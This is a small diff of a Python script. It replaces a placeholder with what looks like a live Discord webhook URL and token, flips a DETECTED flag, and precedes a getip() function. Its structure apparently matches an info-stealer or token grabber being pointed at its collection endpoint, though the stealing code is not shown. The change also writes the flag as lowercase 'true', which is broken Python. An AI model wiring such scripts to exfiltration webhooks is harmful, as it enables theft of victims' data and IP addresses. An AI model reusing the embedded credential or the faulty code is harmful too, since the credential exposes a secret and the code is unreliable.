@@ -20,8 +20,8 @@ import subprocess
 #
 
 
-hook = "WEBHOOK HERE"
-DETECTED = False
+hook = "https://discord.com/api/webhooks/1445658786667958354/hbDvfChR-reJZmtk-tHv8KmzQFcgDoWUxnVozm2Fq7mCwbMUc6yPJgKmVOVGetGAv65j"
+DETECTED = true
 
 
 def getip():
